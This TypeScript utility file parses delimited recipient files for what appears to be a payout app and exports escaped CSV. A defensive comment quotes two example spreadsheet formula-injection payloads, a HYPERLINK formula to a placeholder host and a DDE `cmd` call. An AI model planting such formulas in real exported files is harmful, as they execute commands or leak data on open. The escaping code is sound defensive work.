export function parseDelimited(text: string): string[][] {
  const t = text.replace(/\r\n/g, "\n").replace(/\r/g, "\n").trim();
  if (!t) return [];
  const firstLine = t.split("\n")[0] ?? "";
  const delim =
    (firstLine.match(/\t/g)?.length ?? 0) > 0
      ? "\t"
      : (firstLine.match(/;/g)?.length ?? 0) > (firstLine.match(/,/g)?.length ?? 0)
        ? ";"
        : ",";

  const rows: string[][] = [];
  let cur = "";
  let row: string[] = [];
  let quoted = false;
  for (let i = 0; i < t.length; i++) {
    const ch = t[i] as string;
    if (quoted) {
      if (ch === '"') {
        if (t[i + 1] === '"') {
          cur += '"';
          i++;
        } else quoted = false;
      } else cur += ch;
      continue;
    }
    if (ch === '"') {
      quoted = true;
    } else if (ch === delim) {
      row.push(cur.trim());
      cur = "";
    } else if (ch === "\n") {
      row.push(cur.trim());
      rows.push(row);
      row = [];
      cur = "";
    } else cur += ch;
  }
  row.push(cur.trim());
  rows.push(row);
  return rows.filter((r) => r.some((c) => c !== ""));
}

const ALIASES: Record<string, string[]> = {
  full_name: [
    "full name",
    "name",
    "beneficiary name",
    "beneficiary",
    "recipient",
    "recipient name",
    "payee",
    "payee name",
    "account name",
  ],
  account_number: [
    "account number",
    "acct no",
    "acct",
    "account no",
    "account",
    "acc number",
    "nuban",
  ],
  bank_code: ["bank code", "bank", "sort code", "swift", "bank id", "institution code"],
  phone: ["phone", "phone number", "msisdn", "mobile", "mobile number", "cell", "telephone"],
  amount: ["amount", "amount usdc", "value", "usd", "usdc", "total", "pay", "amount to send"],
  email: ["email", "e-mail", "email address"],
  bank_name: ["bank name", "institution"],
  ifsc: ["ifsc", "ifsc code"],
  upi_id: ["upi", "upi id", "vpa"],
  mobile_network: ["network", "operator", "carrier", "mobile network"],
};

function norm(s: string) {
  return s
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, " ")
    .trim();
}

/** Best-guess mapping from a file's header row to our required fields. */
export function guessMapping(headers: string[], fields: string[]): Record<string, string> {
  const map: Record<string, string> = {};
  const used = new Set<number>();
  for (const field of fields) {
    const cands = [field, ...(ALIASES[field] ?? [])].map(norm);
    let best = -1;
    let bestScore = 0;
    headers.forEach((h, i) => {
      if (used.has(i)) return;
      const n = norm(h);
      if (!n) return;
      let score = 0;
      if (cands.includes(n)) score = 3;
      else if (cands.some((c) => n.includes(c) || c.includes(n))) score = 2;
      if (score > bestScore) {
        bestScore = score;
        best = i;
      }
    });
    if (best >= 0) {
      used.add(best);
      map[field] = String(best);
    }
  }
  return map;
}

export function looksLikeHeader(row: string[], fields: string[]): boolean {
  const guessed = guessMapping(row, fields);
  const digitish = row.filter((c) => /^\+?[\d\s.,-]+$/.test(c)).length;
  return Object.keys(guessed).length >= Math.min(2, fields.length) && digitish < row.length / 2;
}

/**
 * Cells Excel, LibreOffice and Google Sheets treat as the start of a FORMULA rather
 * than text. A recipient named `=HYPERLINK("http://x/"&A1,"Payroll")` — or the
 * classic `=cmd|'/c calc'!A0` — executes on open, and every value in our exports
 * originates in a spreadsheet someone pasted in, which they may not have authored.
 *
 * Quoting alone does not help: a quoted cell is still parsed as a formula once the
 * quotes are stripped by the CSV reader. The accepted mitigation is to prefix the
 * cell with a single quote so the spreadsheet reads it as literal text.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function escapeCell(value: string | number): string {
  const raw = String(value ?? "");
  const safe = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
  // A leading/trailing space can hide a formula lead from a naive check and is
  // also just noise in an id column, so quote anything with edge whitespace too.
  return /[",\n\r]/.test(safe) || safe !== safe.trim() ? `"${safe.replace(/"/g, '""')}"` : safe;
}

export function toCsv(rows: (string | number)[][]): string {
  // CRLF: RFC 4180, and the difference between one row and one cell containing a
  // newline when the file is opened on Windows.
  return rows.map((r) => r.map(escapeCell).join(",")).join("\r\n");
}

export function downloadCsv(filename: string, content: string) {
  // BOM: without it Excel opens UTF-8 as the local 8-bit codepage and mangles every
  // non-ASCII recipient name — which, for these corridors, is most of them.
  const blob = new Blob(["\uFEFF" + content], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.rel = "noopener";
  // Firefox ignores .click() on an element that is not in the document, and revoking
  // the URL in the same tick can cancel the download before it starts.
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 0);
}
